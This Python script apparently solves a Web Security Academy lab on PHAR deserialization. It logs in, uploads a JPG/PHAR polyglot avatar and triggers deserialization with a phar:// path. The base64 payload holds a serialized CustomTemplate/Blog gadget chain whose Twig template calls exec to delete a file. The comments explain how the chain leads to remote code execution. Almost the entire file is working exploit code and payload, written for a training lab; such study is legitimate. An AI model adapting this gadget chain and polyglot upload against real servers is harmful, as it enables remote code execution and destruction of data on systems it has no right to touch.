from web_security_academy.core.logger import logger
from base64 import b64decode

import requests


def solve_lab(session):
    session.login("wiener", "peter")

    logger.info("Directory listing found at /cgi-bin/")
    logger.info("Source code found at /cgi-bin/Blog.php~")
    logger.info("Source code found at /cgi-bin/CustomTemplate.php~")

    # Explanation: CustomTemplate.__destruct tries to remove a file ending in ".lock",
    # which won't work with "/home/carlos/morale.txt". However RCE is possible when
    # deserializing the Blog class, because __wakeup constructs a Twig Environment,
    # and __toString tries to render the template found in $desc. Therefore we can
    # serialize a CustomTemplate object where $template_file_path is a Blog object
    # where $desc is a Twig template that executes "rm /home/carlos/morale.txt". The
    # command is run because CustomTemplate.__destruct will try to concatenate
    # $template_file_path to other strings, which will invoke Blog.__toString

    # Note: In order to upload the PHAR file as an avatar, I created a JPG / PHAR
    # polyglot. This was done by simply appending the PHAR file to a valid JPG file.

    payload = b64decode(
        "/9j/4AAQSkZJRgABAQEAYABgAAD/4QA6RXhpZgAATU0AKgAAAAgAA1EQAAEAAAABAQAAAFERAAQA"
        "AAABAAAAAFESAAQAAAABAAAAAAAAAAD/2wBDAAIBAQIBAQICAgICAgICAwUDAwMDAwYEBAMFBwYH"
        "BwcGBwcICQsJCAgKCAcHCg0KCgsMDAwMBwkODw0MDgsMDAz/2wBDAQICAgMDAwYDAwYMCAcIDAwM"
        "DAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAz/wAARCAABAAED"
        "ASIAAhEBAxEB/8QAHwAAAQUBAQEBAQEAAAAAAAAAAAECAwQFBgcICQoL/8QAtRAAAgEDAwIEAwUF"
        "BAQAAAF9AQIDAAQRBRIhMUEGE1FhByJxFDKBkaEII0KxwRVS0fAkM2JyggkKFhcYGRolJicoKSo0"
        "NTY3ODk6Q0RFRkdISUpTVFVWV1hZWmNkZWZnaGlqc3R1dnd4eXqDhIWGh4iJipKTlJWWl5iZmqKj"
        "pKWmp6ipqrKztLW2t7i5usLDxMXGx8jJytLT1NXW19jZ2uHi4+Tl5ufo6erx8vP09fb3+Pn6/8QA"
        "HwEAAwEBAQEBAQEBAQAAAAAAAAECAwQFBgcICQoL/8QAtREAAgECBAQDBAcFBAQAAQJ3AAECAxEE"
        "BSExBhJBUQdhcRMiMoEIFEKRobHBCSMzUvAVYnLRChYkNOEl8RcYGRomJygpKjU2Nzg5OkNERUZH"
        "SElKU1RVVldYWVpjZGVmZ2hpanN0dXZ3eHl6goOEhYaHiImKkpOUlZaXmJmaoqOkpaanqKmqsrO0"
        "tba3uLm6wsPExcbHyMnK0tPU1dbX2Nna4uPk5ebn6Onq8vP09fb3+Pn6/9oADAMBAAIRAxEAPwD6"
        "0ooor/Hc/ug//9k8P3BocCBfX0hBTFRfQ09NUElMRVIoKTsgPz4NCigBAAABAAAAEQAAAAEAAAAA"
        "APIAAABPOjE0OiJDdXN0b21UZW1wbGF0ZSI6MTp7czozNDoiAEN1c3RvbVRlbXBsYXRlAHRlbXBs"
        "YXRlX2ZpbGVfcGF0aCI7Tzo0OiJCbG9nIjoyOntzOjEwOiIAQmxvZwB1c2VyIjtzOjE6ImEiO3M6"
        "MTA6IgBCbG9nAGRlc2MiO3M6MTA2OiJ7e19zZWxmLmVudi5yZWdpc3RlclVuZGVmaW5lZEZpbHRl"
        "ckNhbGxiYWNrKCJleGVjIil9fXt7X3NlbGYuZW52LmdldEZpbHRlcigicm0gL2hvbWUvY2FybG9z"
        "L21vcmFsZS50eHQiKX19Ijt9fQgAAAB0ZXN0LmpwZwQAAADIU8RlBAAAAAx+f9ikAQAAAAAAAHRl"
        "c3R6JfNSmAyqM+iMvTlkxhT26c0FKAIAAABHQk1C"
    )
    logger.debug(f"Payload: {payload}")

    csrf = session.get_csrf_token("/my-account")
    session.post_path(
        "/my-account/avatar",
        files={"avatar": ("payload.phar", payload)},
        data={"csrf": csrf},
    )
    logger.info("Uploaded payload as avatar image")

    path = "/cgi-bin/avatar.php?avatar=phar://wiener.jpg/nonexistent"
    session.get_path(path)
    logger.info(f'Visited "{path}"')
